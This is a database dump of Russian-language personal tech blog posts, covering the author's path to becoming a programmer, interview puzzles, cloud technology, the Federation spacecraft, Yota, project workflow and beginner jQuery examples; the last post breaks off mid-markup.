	(10, 'ЛИЧНЫЙ ОПЫТ СТАНОВЛЕНИЯ ПРОГРАММИСТОМ', 'Я лично праздновал день программиста зимой, либо четвертого декабря. Так или иначе, могу сказать по поводу себя, чего достиг за этот период. Началось все с мыслей стать программистом, хотя на тот момент не было даже компьютера. После того, как мысль засела в моей голове, я подал документы в колледж по специальности "Автоматизированные системы управления". Собственно сдал экзамены хорошо, после чего попал в группу будущих программистов. За этот период начал изучение от обычной информатики, затем переходя уже к изучению языков программирования. Pascal - был первый язык, который я вполне серьезно освоил. На первом курсе выступал в олимпиаде по информатике и программированию.', '<p style="text-align: justify;"><span style="background-color:rgba(255, 255, 255, 0.9); font-family:open sans,helvetica neue,helvetica,arial,sans-serif; font-size:17.5px">Я лично праздновал день программиста зимой, либо четвертого декабря. Так или иначе, могу сказать по поводу себя, чего достиг за этот период. Началось все с мыслей стать программистом, хотя на тот момент не было даже компьютера. После того, как мысль засела в моей голове, я подал документы в колледж по специальности &quot;Автоматизированные системы управления&quot;. Собственно сдал экзамены хорошо, после чего попал в группу будущих программистов. За этот период начал изучение от обычной информатики, затем переходя уже к изучению языков программирования. Pascal - был первый язык, который я вполне серьезно освоил. На первом курсе выступал в олимпиаде по информатике и программированию.</span><br />\r\n<br />\r\n<span style="background-color:rgba(255, 255, 255, 0.9); font-family:open sans,helvetica neue,helvetica,arial,sans-serif; font-size:17.5px">Презентовал на Паскале игру морской бой, а также тетрис в простейшем варианте. Мой классный руководитель поощряла мою пытливость ума. По программе обучения у нас было изучение DOS-команд, затем работа с FoxPro, оболочкой Norton. На старших курсах началось изучение Delphi и разработка ПО на нем. На втором курсе я уже работал в ВЦ колледжа параллельно с учебой. Защищал диплом после создания программы, проверяющим был преподаватель мужчина.</span><br />\r\n<br />\r\n<span style="background-color:rgba(255, 255, 255, 0.9); font-family:open sans,helvetica neue,helvetica,arial,sans-serif; font-size:17.5px">После сдачи экзаменов в колледже, я решил учиться дальше и опять же по информационной ветке развития. Потому я вступительные экзамены сдавал в РГТЭУ по специальности &quot;Прикладная информатика в экономике&quot;. Первый курс в университете был довольно абстрактным в дисциплинах, там были общие предметы, где я сидел в одной аудитории с юристами, экономистами, бухгалтерами. Нам преподавали историю, информатику, философию, экономику базовую. На втором курсе обучение приобрело уже окрас программиста. Было много математик, это занимало у нас одну треть предметов от всех предметов. Кроме того были предметы по экономике.</span><br />\r\n<br />\r\n<span style="background-color:rgba(255, 255, 255, 0.9); font-family:open sans,helvetica neue,helvetica,arial,sans-serif; font-size:17.5px">Третий-четвертый курс обучения принес мне знания по СУБД Oracle и PL/SQL. Кроме того началось изучение в направление веб-программиста. Соответственно back-end разработку я уже узнал в общих чертах в университете. Изучение шло макроэкономики и экономики предприятия.</span><br />\r\n<br />\r\n<span style="background-color:rgba(255, 255, 255, 0.9); font-family:open sans,helvetica neue,helvetica,arial,sans-serif; font-size:17.5px">Пятый курс представлял собой закрепление пройденного, а также изучение абстрактных понятий, таких как моделирование информационных систем, разделение труда, в том числе среди ИТ-специалистов. Потому на четвертом-пятом курсе я учился очень прохладно, так как предметы казались мне легки. Кроме того на этих курсах было изучение 1С, который я сразу невзлюбил, собственно учился по нему по минимуму, чтобы больше времени тратить на языки Делфи, Шарп. Дипломная работа была у меня по теме: &quot;Логистическая информационная система&quot;, где был смоделирован векторный движок, что-то вроде картографических систем ДубльГИС. Программа должна была решать логистические задачи. Защитил я диплом на отлично, на выпускном в университете получил красный диплом. Был направлен в научный институт Новосибирского филиала, чтобы продолжить обучение в качестве аспиранта. Мне поручили изучать облачные технологии и непосредственно Java. Однако я бросил учебу в аспирантуре и начал работать уже программистом, так как хотел заработать денег. Собственно такая история моего становления, как программиста.</span><br />\r\n<br />\r\n<span style="background-color:rgba(255, 255, 255, 0.9); font-family:open sans,helvetica neue,helvetica,arial,sans-serif; font-size:17.5px">Через два года я отправился в путешествие на собственном автомобиле в Новосибирск, где и решил пробовать себя в качестве программиста. Поиск работы был неуспешным. Во-первых, работодатели критически относились к моим возможностям и знаниям. Во-вторых, я слишком был прост для них по общению и стилю одежды. Однако я смог поработать на Норвежскую компанию занимающуюся созданием рекламы и маркетинговой продукции. Мои же обязанности были проектирование кадастровой карты региона. После такого опыта я занимался веб-проектированием и созданием веб-технологий на 1с-Битриксе, а также создания облачных технологий. Также позже мне удалось сотрудничество с германской строительной компанией, однако, в силу того форс-мажорных обстоятельств а также нестабильности CMS Modx контракт не был продлен в дальнейшем.</span><br />\r\n<br />\r\n<span style="background-color:rgba(255, 255, 255, 0.9); font-family:open sans,helvetica neue,helvetica,arial,sans-serif; font-size:17.5px">Из последних лет был опыт создания своей CMS/Framework TheSolarWind. По сути это система проектирования веб-проектов, как простых, так&nbsp; сложных систем, таких как интернет-магазин. От направления Back-End постепенно переходил в направление Frond-End. Собственно вот такое было моим развитие в ИТ отрасли. Кроме того был опыт создание зачатков искусственного интеллекта в плане &quot;чтения&quot; информации из интернета. Алгоритм шифрования данных &quot;Алгоритм писателя&quot; также было одним из последних достижений в области науки и проектирования информационных технологий. Более отдаленное и не относящееся к программированию можно также посчитать работу в области изучения космоса с точки зрения программиста. Анализирование спектрального класса звезд в разных цветовых схемах RGB, CMYK и двоичном коде. Помимо этого я в последнее время занимался созданием космических аппаратов и лифта, который бы был новой технологией в области полетов в космосе.</span></p>\r\n', '2022-09-14 13:19:35', '2022-09-14 13:19:35', 'Admin', '8261166402208c1d878b.jpg', 0, 0),
	(11, 'ЗАДАЧА ПО JS [ПРОГРАММИРОВАНИЕ]', 'На собеседованиях в разных организациях задают разные вопросы программистам. Однажды мне встретился такой вопрос по JS. Формулировка задачи звучала так.\r\n\r\nИмеется такой код JS:\r\n\r\nvar mas = new Array("a", “b”)\r\nvar pushed = mas.push(function() { log.console(this)}\r\n\r\nЧто пойдет на вывод в консоль браузера?', '<p style="text-align:justify">На собеседованиях в разных организациях задают разные вопросы программистам. Однажды мне встретился такой вопрос по JS. Формулировка задачи звучала так.</p>\r\n\r\n<p style="text-align:justify">Имеется такой код JS:</p>\r\n\r\n<p style="text-align:justify"><strong>var mas = new Array(&quot;a&quot;, &ldquo;b&rdquo;)<br />\r\nvar pushed = mas.push(function() { log.console(this)}</strong></p>\r\n\r\n<p style="text-align:justify">Что пойдет на вывод в консоль браузера?<br />\r\n<br />\r\n<span style="background-color:rgb(255, 255, 0)">JS</span><br />\r\nОтвет тут такой, если в первой строке кода в переменную mas создаем массив, куда добавляем сразу два значения. То после push, мы выводим в консоль сам массив mas, потому что this в данном случае обозначает сам массив mas.<br />\r\n&nbsp;</p>\r\n', '2022-09-14 13:22:52', '2022-09-14 13:22:52', 'Admin', '68f124c166d808ab838f.jpg', 0, 0),
	(12, 'ЗАДАЧА ВЕДЕР [ЛОГИКА]', 'Для тех кто любит решать логические задачи. Кстати такие вопросы иногда также задают на собеседованиях в приличные компании занимающиеся разработкой программных и веб-проектов. Задача звучит так:\r\n\r\nИмеется шесть ведер в порядке, как на изображении. Сделать чтобы пустое ведро сменялось полным и наоборот. Можно перемещать только одно ведро. Как это сделать?', '<p style="text-align:justify">Для тех кто любит решать логические задачи. Кстати такие вопросы иногда также задают на собеседованиях в приличные компании занимающиеся разработкой программных и веб-проектов. Задача звучит так:</p>\r\n\r\n<blockquote>\r\n<p>Имеется шесть ведер в порядке, как на изображении. Сделать чтобы пустое ведро сменялось полным и наоборот. Можно перемещать только одно ведро. Как это сделать?</p>\r\n\r\n<p><img alt="" src="/yii2blog/files/vedra_web.jpg" style="height:102px; width:400px" /></p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify">Ответ логика:<br />\r\nЕще одна логическая задача, которая решается довольно легко. Берем пятое ведро и переливаем воду во второе ведро, после чего у нас получается очередность ведер, где пустое ведро сменяется заполненным и наоборот.</p>\r\n', '2022-09-14 13:25:59', '2022-09-14 13:27:05', 'Admin', 'b82fb286f95229b1d6cb.jpg', 0, 0),
	(13, 'ОБЛАКА И ОБЛАЧНЫЕ ТЕХНОЛОГИИ', 'Что же такое облака и облачные технологии в понимании людей?\r\n\r\nОблако - это хранилище данных с распределенной обработкой таких данных. Данные размещается на сетевом ресурсе в интернете, либо в корпоративной сети. По сути в простейшем случае облако - это каталог, который доступен для некоторых пользователей. Доступ к облаку может быть разделен правами, где одни пользователи могут только читать ресурсы, другие же редактировать и добавлять новые материалы. В облаке представлен файловый набор данных для пользователей системы. Кроме того в облаке размещаются сервисы почты, архивные материалы, вычислительные средства облака, системы моделирования каких-либо процессов.', '<p style="text-align:justify">Что же такое облака и облачные технологии в понимании людей?</p>\r\n\r\n<p style="text-align:justify">Облако - это хранилище данных с распределенной обработкой таких данных. Данные размещается на сетевом ресурсе в интернете, либо в корпоративной сети. По сути в простейшем случае облако - это каталог, который доступен для некоторых пользователей. Доступ к облаку может быть разделен правами, где одни пользователи могут только читать ресурсы, другие же редактировать и добавлять новые материалы. В облаке представлен файловый набор данных для пользователей системы. Кроме того в облаке размещаются сервисы почты, архивные материалы, вычислительные средства облака, системы моделирования каких-либо процессов.</p>\r\n\r\n<p style="text-align:justify">Облачные технологии являются перспективным направлением. Когда я поступал в аспирантуру - Сибирское отделение РАН, то моей первой работой было: &quot;Создание облака и изучение облачных технологий на языке Java&quot;. В тот период я не знал языка Java, тем не менее общие концепции облака освоил, и спроектировал контейнер данных облака в своей системе TheSolarWind.</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/clould_.jpg" style="border:2px solid; box-sizing:border-box; height:375px; vertical-align:middle; width:500px" /></p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/clould_model.jpg" style="border:2px solid; box-sizing:border-box; height:441px; vertical-align:middle; width:600px" /></p>\r\n\r\n<p style="text-align:justify">К облаку подключаются разные устройства, от телефонов, планшетов, до компьютеров и вычислительных станций, которые могут осуществлять на облаке определенные вычислительные процессы. В совокупности такая структура работы позовляет наладить обмен данными, например, в научной лаборатории, где ведущий компьютер с сильными физическими характеристиками осуществляет математические, экономические операции моделирования чего-либо, а остальные клиенты облака подключаются и читают данные, отчеты совершаемые в облаке.</p>\r\n\r\n<p style="text-align:justify">Моделирование жизненных процессов, экономики, физических испытаний позволяют существенно сэкономить деньги на тесты при создании новых изобретений. Компьютер в измерении моделирования сам просчитывает все возможные действия и операции в экономике, математике. С облаками можно легко запустить нового вида ракету и тестировать запуски новых технологий в виртуальной реальности, а после того спроектировать в реальной жизни космический корабль способный летать на альтернативных технологиях. Облака позволяют систематизировать данные, и значительно быстрее исследовать новые технологии, чаще совершать научные открытия и добиваться больших успехов в исследовании.</p>\r\n\r\n<p style="text-align:justify">Управление государством также возможно с технологией облаков. Если смоделировать реалистичную картину управления государством в облаке, к которому будут подключены разные клиенты системы, то можно отточить до безошибочных действий власти. После чего можно подключить ИИ (Искусственный интеллект) который будет нивелировать человеческие ошибки в работе. Собственно такое управление государством появится в будущем в развитых государствах.</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/clould_slide-6.jpg" style="border:2px solid; box-sizing:border-box; height:375px; vertical-align:middle; width:500px" /></p>\r\n\r\n<p style="text-align:justify">Собственно вот такие облачные технологии...</p>\r\n', '2022-09-14 13:30:56', '2022-09-14 13:30:56', 'Admin', '0acf025728aea078fe11.jpg', 0, 0),
	(14, 'МНОГОРАЗОВЫЙ КОСМИЧЕСКИЙ КОРАБЛЬ "ФЕДЕРАЦИЯ"', 'По случаю дня космонавтов президент России Владимир Путин заявил, что планы по освоению Луны и Марса никак не изменятся в связи с политическим и экономическим противостоянием между разными группами государств. В 2009 году РКК в космическом салоне "МАКС" РКК "Энергия" выиграли тренд на создание космического многоразового корабля "Федерация"\r\n\r\nИспытания разных компонентных частей корабля шли с 2012 года. Россия планирует в 2018 году начать испытания со сбросами спускаемого аппарата корабля с самолёта. В 2026 создатели планируют осуществить первый беспилотный облёт Луны космического корабля "Федерация". В 2027 — запуск взлётно-посадочного модуля на орбиту Луны по регламенту плана инженеров "Энергия". В 2029 - 2031 годах разработчики планируют осуществить пилотируемый полет на Луну с группой российских космонавтов.', '<p style="text-align:justify">По случаю дня космонавтов президент России Владимир Путин заявил, что планы по освоению Луны и Марса никак не изменятся в связи с политическим и экономическим противостоянием между разными группами государств. В&nbsp;<span style="background-color:rgb(255, 255, 0)">2009</span>&nbsp;году РКК в космическом салоне &quot;МАКС&quot; РКК &quot;Энергия&quot; выиграли тренд на создание космического многоразового корабля &quot;Федерация&quot;</p>\r\n\r\n<p style="text-align:justify">Испытания разных компонентных частей корабля шли с&nbsp;<span style="background-color:rgb(255, 255, 0)">2012</span>&nbsp;года. Россия планирует в&nbsp;<span style="background-color:rgb(255, 255, 0)">2018</span>&nbsp;году начать испытания со сбросами спускаемого аппарата корабля с самолёта. В&nbsp;<span style="background-color:rgb(255, 255, 0)">2026</span>&nbsp;создатели планируют осуществить первый беспилотный облёт Луны космического корабля &quot;Федерация&quot;. В&nbsp;<span style="background-color:rgb(255, 255, 0)">2027</span>&nbsp;&mdash; запуск взлётно-посадочного модуля на орбиту Луны по регламенту плана инженеров &quot;Энергия&quot;. В&nbsp;<span style="background-color:rgb(255, 255, 0)">2029 - 2031</span>&nbsp;годах разработчики планируют осуществить пилотируемый полет на Луну с группой российских космонавтов.</p>\r\n\r\n<p style="text-align:justify">Господин президент Владимир Владимирович Путин рассказал о будущих планах России в космосе и проекте &quot;Федерация&quot;:</p>\r\n\r\n<blockquote>\r\n<p>Вы знаете, что программа рассчитана до&nbsp;<span style="background-color:rgb(255, 255, 0)">2030</span>&nbsp;года. Уже заканчивается работа над созданием корабля &ldquo;Федерация&rdquo; и началась работа по сверхтяжелой ракете, которая должна быть использована для работы по Луне. Так что здесь сомнений нет, будем активно работать, будем эту программу осуществлять. Сначала станция на лунной орбите, а потом уже &mdash; модули на самой Луне, во всяком случае, так планируется. Надеюсь, что так оно и будет</p>\r\n</blockquote>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/federaciya_raketa.jpg" style="border:2px solid; box-sizing:border-box; height:400px; vertical-align:middle; width:600px" /></p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/federaciya_raketa3.jpg" style="border:2px solid; box-sizing:border-box; height:378px; vertical-align:middle; width:600px" /></p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/federaciya_raketa4.jpg" style="border:2px solid; box-sizing:border-box; height:363px; vertical-align:middle; width:600px" /></p>\r\n\r\n<p style="text-align:justify">Из технического описания корабля, характеристики &quot;Федерации&quot; таковы:</p>\r\n\r\n<blockquote>\r\n<p>КК &laquo;Федерация&raquo; будет способен взять на борт до&nbsp;<span style="background-color:rgb(255, 255, 0)">6</span>&nbsp;членов экипажа,&nbsp;<span style="background-color:rgb(255, 255, 0)">500 кг</span>&nbsp;груза, а также до 30 суток находиться в автономном полёте и до&nbsp;<span style="background-color:rgb(255, 255, 0)">1</span>&nbsp;года в составе орбитальной станции. Его спускаемый аппарат будет из алюминиевых сплавов. Объём герметичного отсека составит&nbsp;<span style="background-color:rgb(255, 255, 0)">18</span>&nbsp;м&sup3;. Должен иметь возможность управляться одним человеком. Его оснастят твердотопливными двигателями тягой&nbsp;<span style="background-color:rgb(255, 255, 0)">22.5</span>&nbsp;тс и однокомпонентными двигателями на перекиси водорода тягой&nbsp;<span style="background-color:rgb(255, 255, 0)">75</span>&nbsp;кгс.</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify">Из информации о будущем корабле РФ.</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/federaciya_raketa2.png" style="border:2px solid; box-sizing:border-box; height:400px; vertical-align:middle; width:600px" /></p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/federation_raketa.png" style="border:2px solid; box-sizing:border-box; height:320px; vertical-align:middle; width:600px" /></p>\r\n\r\n<p style="text-align:justify">Новый российский космический корабль &quot;Федерация&quot; будет в&nbsp;<span style="background-color:rgb(255, 255, 0)">3,5</span>&nbsp;раза дешевле американского многоразового космического корабля &quot;Дракона&quot;. Итак, в цене корабль &quot;Федерация&quot; выигрывает &quot;Дракона&quot; даже на создании макета и технологической начинки.</p>\r\n', '2022-09-14 13:38:59', '2022-09-14 13:38:59', 'Admin', '80f191762567884c91c4.jpg', 0, 0),
	(15, 'YOTA ПЕРЕДАЮЩАЯ БЫСТРЫЕ ЙОТЫ', 'Yota - оператор беспроводной интернет-связи высокой скорости основанная в 2008 году. Российская телекоммуникационная компания и федеральный оператор беспроводной связи был создан при поддержке компании Мегафон. Основные направления компании — предоставление услуг мобильной связи и 4G-интернета. Зона покрытия связи практически вся территория России.\r\n\r\nНа логотипе компании демонстрируется перевернутый человек, исполненный в стиле минимализма, называемый «Нуф», или же «Nuf»: если прочитать это слово задом наперёд — «Fun, хотя если разглядывать йота модем, то мне лично больше нравится оценивать человечка, как вздымающего руки вверх. ', '<p style="text-align:justify">Yota - оператор беспроводной интернет-связи высокой скорости основанная в&nbsp;<span style="background-color:rgb(255, 255, 0)">2008</span>&nbsp;году.&nbsp;Российская телекоммуникационная компания и федеральный оператор беспроводной связи был создан при поддержке компании Мегафон. Основные направления компании &mdash; предоставление услуг мобильной связи и 4G-интернета. Зона покрытия связи практически вся территория России.</p>\r\n\r\n<p style="text-align:justify">На логотипе компании демонстрируется перевернутый человек, исполненный в стиле минимализма, называемый &laquo;Нуф&raquo;, или же &laquo;Nuf&raquo;: если прочитать это слово задом наперёд&nbsp;&mdash; &laquo;Fun, хотя если разглядывать йота модем, то мне лично больше нравится оценивать человечка, как вздымающего руки вверх.&nbsp;</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/yota2.jpg" style="border:2px solid; box-sizing:border-box; height:299px; vertical-align:middle; width:400px" /></p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/yota.jpg" style="border:2px solid; box-sizing:border-box; height:266px; vertical-align:middle; width:400px" /></p>\r\n\r\n<p style="text-align:justify">Так или иначе компания Yota зарекомендовала себя, как высокоскоростной провайдер интернет-связи. Кроме того в связи с блокировками Телеграм, Yota готова возместить ущерб и вернуть деньги, которые люди тратили за использование Телеграм. Так что ни одна йота не будет потеряна в ходе подобных действий со стороны роскомнадзора.</p>\r\n\r\n<p style="text-align:justify">В общем от себя скажу, что рекомендую Yota-модем, как оператор достойной связи.</p>\r\n', '2022-09-14 13:43:03', '2022-09-14 13:43:03', 'Admin', '5265bd140c8019adfb47.jpg', 0, 0),
	(16, 'JQUERY И РАБОТА С ФРЕЙМВОРКОМ JS', 'JQuery - js фреймворк, библиотека js кодов, которая позволяет осуществлять более эффективные задачи и эффекты в реализации программного кода в frondend контенте веб-представления данных.\r\n\r\nИтак, без лишних предисловий описаний для программистов, которые знают суть такой технологии, напишу код для новичков, а также покажу шпаргалку выполнения кода. Так выглядит исполнительный контейнер кода, а также подключение библиотеки:\r\n\r\n', '<p style="text-align:justify">JQuery - js фреймворк, библиотека js кодов, которая позволяет осуществлять более эффективные задачи и эффекты в реализации программного кода в frondend контенте веб-представления данных.</p>\r\n\r\n<p style="text-align:justify">Итак, без лишних предисловий описаний для программистов, которые знают суть такой технологии, напишу код для новичков, а также покажу шпаргалку выполнения кода. Так выглядит исполнительный контейнер кода, а также подключение библиотеки:</p>\r\n\r\n<p style="text-align:justify">Пример кода выглядит так:</p>\r\n\r\n<pre style="text-align:justify">\r\n<span style="background-color:#FFD700">&lt; html lang=&quot;en&quot; class=&quot;no-js&quot;&gt;\r\n &lt; head&gt;\r\n   &lt; meta charset=&quot;utf-8&quot;&gt;\r\n   &lt; meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;\r\n   &lt; meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;\r\n   &lt; title&gt;Заголовок\r\n   &lt; meta name=&quot;description&quot; content=&quot;A free HTML5/CSS3 template&quot; /&gt;\r\n   &lt; meta name=&quot;keywords&quot; content=&quot;html5 template, css3, one page, animations, agency, portfolio, web design&quot; /&gt;\r\n   &lt; meta name=&quot;author&quot; content=&quot;&quot; /&gt;\r\n   &lt; script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js&quot;&gt;\r\n &lt; /head&gt;\r\n&lt; script type=&quot;text/javascript&quot;&gt;\r\n  $ (document).ready(function() {\r\n     console.log(&#39;test message in console&#39;);\r\n     $(&#39;#test&#39;).click(function() {   \r\n        console.log(&#39;test&#39;); // тестируем событие клика и пишем в консоли слово test\r\n     });\r\n  });    \r\n&lt; /script&gt;   \r\n&lt; body&gt;\r\n  &lt; div&gt;\r\n    &lt; h3&gt;Простейший код для новичков\r\n    &lt; button id=&quot;test&quot; name=&quot;test&quot; value=&quot;Тест&quot;/&gt;\r\n  &lt; /div&gt;    \r\n&lt; /body&gt;  </span>\r\n              </pre>\r\n\r\n<p style="text-align:justify">А вот событие клика по кнопке, и исполнение написания в консоли браузера сообщения:</p>\r\n\r\n<pre style="text-align:justify">\r\n<span style="background-color:#FFD700">$(&#39;#test&#39;).click(function() {   \r\n    console.log(&#39;test&#39;);\r\n  });</span>\r\n        </pre>\r\n\r\n<p style="text-align:justify">Собственно в JQuery много возможностей реализации кода, а также создание различных плюшек для показа плавного скроллинга, переключения цветовой гаммы и стиля css программными средствами фреймворка JQuery.</p>\r\n', '2022-09-14 13:46:37', '2022-09-14 13:46:37', 'Admin', '4437eacf2bb74ee07ca0.jpg', 0, 0),
	(17, 'ПРОЕКТ И ЕГО ВЫПОЛНЕНИЕ', 'Представьте себе ситуацию, вы уютненько сидите в своем кабинете-офисе, вращаетесь на офисном кресле, никого не трогаете, делаете вид, что работаете, как вдруг к вам в кабинет бесцеремонно вторгается ваш начальник. Он подходит к вам с серьезным видом, обращаясь к вам по имени, и говорит, что вам предстоит выполнить серьезный проект. Вы в легком замешательстве. Ваше руководящее лицо рассказывает вам о том, что для вас пришли трудные времена.\r\n\r\nИтак, перед глазами у вас вырисовывается мрачная картина будущего. Начальство решило развернуть свой сервер базы данных, а также провести полную автоматизацию рабочих мест в вашей компании. Причем сбор информации, структуризация данных и все прочее отдается на ваше усмотрение. Хотя в будущем, вас, наверняка, проконтролируют и проверят, насколько корректен ваш код и насколько вы заслужили свои сорок-пятьдесят тысяч рублей в месяц в должности ведущего программиста.', '<p style="text-align:justify">Представьте себе ситуацию, вы уютненько сидите в своем кабинете-офисе, вращаетесь на офисном кресле, никого не трогаете, делаете вид, что работаете, как вдруг к вам в кабинет бесцеремонно вторгается ваш начальник. Он подходит к вам с серьезным видом, обращаясь к вам по имени, и говорит, что вам предстоит выполнить серьезный проект. Вы в легком замешательстве. Ваше руководящее лицо рассказывает вам о том, что для вас пришли трудные времена.</p>\r\n\r\n<p style="text-align:justify">Итак, перед глазами у вас вырисовывается мрачная картина будущего. Начальство решило развернуть свой сервер базы данных, а также провести полную автоматизацию рабочих мест в вашей компании. Причем сбор информации, структуризация данных и все прочее отдается на ваше усмотрение. Хотя в будущем, вас, наверняка, проконтролируют и проверят, насколько корректен ваш код и насколько вы заслужили свои сорок-пятьдесят тысяч рублей в месяц в должности ведущего программиста.</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/office_work2.jpg" style="border:2px solid; box-sizing:border-box; height:266px; vertical-align:middle; width:400px" /></p>\r\n\r\n<p style="text-align:justify">Кажется, тучи сгущаются, после того, как начальник оставляет вас в полном одиночестве наедине с новым проектом. Папка с проектом тревожит лишь своим присутствием. Итак, откинув все смятение, вы начинаете анализировать свои шансы на успешную сдачу проекта, а также защитить свое рабочее место от посягательств других конкурентов.</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/office_work1.jpg" style="border:2px solid; box-sizing:border-box; height:391px; vertical-align:middle; width:600px" /></p>\r\n\r\n<p style="text-align:justify">Итак, ваши шаги должны быть следущие:</p>\r\n\r\n<p style="text-align:justify"><span style="background-color:rgb(255, 255, 0)">1</span>. Вы должны запомнить информацию о задачи, и попросить у начальника представить и&nbsp;<span style="background-color:rgb(255, 255, 0)">сформулировать задачу в виде технической документации</span>. В ТЗ формулируется основные тезисы и регламенты задачи. Соответственно, как программисту, вам должно быть понятно, как выполнить поставленные требования со стороны начальника.</p>\r\n\r\n<p style="text-align:justify"><span style="background-color:rgb(255, 255, 0)">2</span>. Вторым этапом в ходе работы должно быть<span style="background-color:rgb(255, 255, 0)">&nbsp;сбор данных</span>. Если работа связана с автоматизацией процессов, то обязательно нужно изучить весь документооборот на предприятии/организации. После чего в голове формируется четкий план действий. Здесь вам придется контактировать с людьми из разных подразделений организации и узнавать суть документаоборота. Кроме того участники процесса автоматизации могут предьявлять вам претензии, если программа будет неудобной для заполнения или практической работы.</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/office_work3.jpg" style="border:2px solid; box-sizing:border-box; height:265px; vertical-align:middle; width:400px" /></p>\r\n\r\n<p style="text-align:justify"><span style="background-color:rgb(255, 255, 0)">3. Создание структуры данных и базы данных</span>. На данном этапе программист должен создать информационную базу данных, где все структурированные данные в виде чертежей, схем, а также информация по докментообороту должны быть представлены в физической модели базы данных. Таблицы БД должны быть нормализованны.</p>\r\n\r\n<p style="text-align:justify"><span style="background-color:rgb(255, 255, 0)">4.</span>&nbsp;Следующий шаг в ходе работы программиста -&nbsp;<span style="background-color:rgb(255, 255, 0)">создание веб-приложения, либо прикладной программы</span>, которая будет связана с БД. Если программа создана в Шарпе (C#), Delphi, Java, то по всей видимости проект будет десктопным для пользователя. Если же программист решит осуществить свои задумки в веб-интерфейсе, то логика будет осуществлена в вебе.</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/default.jpg" style="border:2px solid; box-sizing:border-box; height:191px; vertical-align:middle; width:200px" /></p>\r\n\r\n<p style="text-align:justify"><span style="background-color:rgb(255, 255, 0)">5. Пользовательский интерфейс и отчетные выходные данные.</span>&nbsp;В программе, после постановки задачи со стороны начальства, программист должен осуществить в первую очередь пользовательский интерфейс и отчетные выходные данные. Пользовательский интерфейс - различного рода табличные данные, графики, отчеты в виде документов. Отчет - представляет собой результат выборки данных из БД в соответствии с условиями и параметрами выбора со стороны пользователя. Конечный результат - печатный документ, либо электронный документ в известных форматах документа / электронной таблицы.</p>\r\n\r\n<p style="text-align:justify">Собственно тогда работа считается выполненной. И на лице начальства появляется чуть радостное выражение, так как программист беззаботно вращающийся в своем кожаном кресле сумел решить задачу. Однако расслабляться инженеру некогда, так как вслед за одной работой, приходит новая работа. И так проходят трудовые будни программиста и разработчика высоких технологий!</p>\r\n', '2022-09-14 13:51:31', '2022-09-14 13:51:31', 'Admin', 'b837916daffe2e6406b5.jpg', 0, 0),
	(18, 'РАБОТА С JS И JQUERY', 'В программировании часто приходится писать скрипты, как стороне сервера, так и на стороне клиента.\r\nНа стороне клиента скрипты обрабатываются в форме js скриптов. Иногда такие скрипты оборачиваются в дополнительные js-фреймворки, такие как JQuery. JQuery - современный js-фреймворк для обработки событий в браузере, а также создания, анимации, особенностей frond-end программирования.\r\n\r\nСамо выполнение скрипта выполняется в обрамлениях тега: <script></script> Соответственно, чтобы вызвать чистый js, либо JQuery, нужно делать обращения через подобные обертки В параметре src пишется адрес подключения библиотеки, которая будет подключена к скрипту. Без параметра src тег <script></script> подразумевает выполнение кода frond-end контекта.', '<p style="text-align:justify">В программировании часто приходится писать скрипты, как стороне сервера, так и на стороне клиента.<br />\r\nНа стороне клиента скрипты обрабатываются в форме js скриптов. Иногда такие скрипты оборачиваются в дополнительные js-фреймворки, такие как JQuery. JQuery - современный js-фреймворк для обработки событий в браузере, а также создания, анимации, особенностей frond-end программирования.<br />\r\n<br />\r\nСамо выполнение скрипта выполняется в обрамлениях тега: &lt;script&gt;&lt;/script&gt; Соответственно, чтобы вызвать чистый js, либо JQuery, нужно делать обращения через подобные обертки В параметре src пишется адрес подключения библиотеки, которая будет подключена к скрипту. Без параметра src тег&nbsp;<span style="background-color:rgb(255, 255, 0)">&lt;script&gt;&lt;/script&gt;</span>&nbsp;подразумевает выполнение кода frond-end контекта.<br />\r\n<br />\r\nВот как выполняется&nbsp;<span style="background-color:rgb(255, 255, 0)">обращение к js-скрипту</span>:</p>\r\n\r\n<blockquote>\r\n<p><br />\r\n&lt;html&gt;<br />\r\n&lt;body&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;h1&gt;Скрипт&lt;/h1&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;script type=&quot;text/javascript&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(&quot;Выполнение скрипта js осуществлено!&quot;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/script&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;h1&gt;Тест страница&lt;/h1&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\nЧтобы&nbsp;<span style="background-color:rgb(255, 255, 0)">подключить JQuery библиотеку</span>, нужно выполнить один из способов подключения:<br />\r\n<br />\r\n<span style="background-color:rgb(255, 255, 0)">1. Способ первый.</span><br />\r\n&nbsp;&nbsp; Скачать локально библиотеку JQuery и кинуть ее в каталог веб-проекта, после чего подключить:</p>\r\n\r\n<blockquote>\r\n<p><br />\r\n&lt;!DOCTYPE html&gt;<br />\r\n&lt;html lang=&quot;en&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;meta 